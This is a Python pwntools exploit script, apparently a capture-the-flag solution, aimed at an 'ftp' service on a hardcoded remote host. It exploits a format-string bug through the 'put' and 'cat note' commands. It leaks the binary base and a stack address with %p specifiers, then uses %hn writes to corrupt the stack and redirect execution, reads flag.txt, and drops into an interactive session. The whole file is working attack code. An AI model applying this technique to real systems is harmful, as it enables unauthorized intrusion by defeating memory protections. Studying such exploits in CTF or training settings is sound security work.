#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.216.39.14 --port 1234 ftp
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ftp')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.216.39.14'
port = int(args.PORT or 1234)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

signature = b"Green-Avocado"

io = start()

io.sendlineafter(b": ", b"anonymous")
io.sendlineafter(b": ", b"")

io.sendlineafter(b"ftp> ", b"put " + signature + b"%63$p")
io.sendlineafter(b"ftp> ", b"cat note")
io.recvuntil(signature)
exe.address = int(io.recvuntil(b'\n', drop=True), 0) - 0x00001c20
io.info("EXE: " + hex(exe.address))

io.sendlineafter(b"ftp> ", b"put " + signature + b"%126$p")
io.sendlineafter(b"ftp> ", b"cat note")
io.recvuntil(signature)
rbp = int(io.recvuntil(b'\n', drop=True), 0)
io.info("RBP: " + hex(rbp))

write = (rbp + (0xffffd0cc-0xffffd2f8) - len(signature)) % 0x10000

io.sendlineafter(b"ftp> ", b"put " + signature + "%{}c%62$hn".format(write).encode())
io.sendlineafter(b"ftp> ", b"cat note")
if signature not in io.recvline():
    io.error("SIGNATURE NOT FOUND")

io.sendlineafter(b"ftp> ", b"put " + signature + b"%126$p")
io.sendlineafter(b"ftp> ", b"cat note")
io.recvuntil(signature)
io.info("RBP: " + hex(int(io.recvuntil(b'\n', drop=True), 0)))

write = ((exe.address + 0x00001bd4) - len(signature)) % 0x10000

io.sendlineafter(b"ftp> ", b"put " + signature + "%{}c%126$hn".format(write).encode())
io.sendlineafter(b"ftp> ", b"cat note")
if signature not in io.recvline():
    io.error("SIGNATURE NOT FOUND")

io.sendlineafter(b"ftp> ", b"put Pwned by " +  signature)
io.sendlineafter(b"ftp> ", b"cat flag.txt")

io.interactive()

